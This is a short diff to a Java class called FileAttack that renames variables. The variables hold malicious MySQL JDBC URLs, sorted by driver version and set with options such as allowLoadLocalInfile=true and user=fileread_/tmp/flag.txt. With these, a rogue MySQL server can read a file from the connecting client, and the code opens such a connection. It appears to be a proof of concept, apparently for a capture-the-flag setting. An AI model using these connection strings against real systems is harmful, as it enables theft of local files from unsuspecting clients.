@@ -15,22 +15,22 @@ public class FileAttack {
         /**
          * [3.1.11, 3.1.14]
          */
-        String fileReadAttackUrl_3 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
+        String fileReadAttackURL_3 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
 
         /**
          * [5.0.2, 5.1.48]
          */
-        String fileReadAttackUrl_5 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
+        String fileReadAttackURL_5 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
 
         /**
          * [6.0.2, 6.0.6]
          */
-        String fileReadAttackUrl_6 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
+        String fileReadAttackURL_6 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";
 
         /**
          * [8.0.7-dmr,8.0.23]
          */
-        String fileReadAttackUrl_8_7_23 = "jdbc:mysql://127.0.0.1:3306/test?&allowLoadLocalInfile=true&user=fileread_/tmp/flag.txt";
+        String fileReadAttackURL_8_7_23 = "jdbc:mysql://127.0.0.1:3306/test?&allowLoadLocalInfile=true&user=fileread_/tmp/flag.txt";
 
         // 低版本需要加载
         String driver = "com.mysql.jdbc.Driver";
@@ -38,7 +38,7 @@ public class FileAttack {
 
         String test = "jdbc:mysql://127.0.0.1:3306/test?&allowLoadLocalInfile=true&user=fileread_/tmp/flag.txt";
 
-        Connection connection = DriverManager.getConnection(fileReadAttackUrl_8_7_23);
+        Connection connection = DriverManager.getConnection(fileReadAttackURL_8_7_23);
     }
 
 }
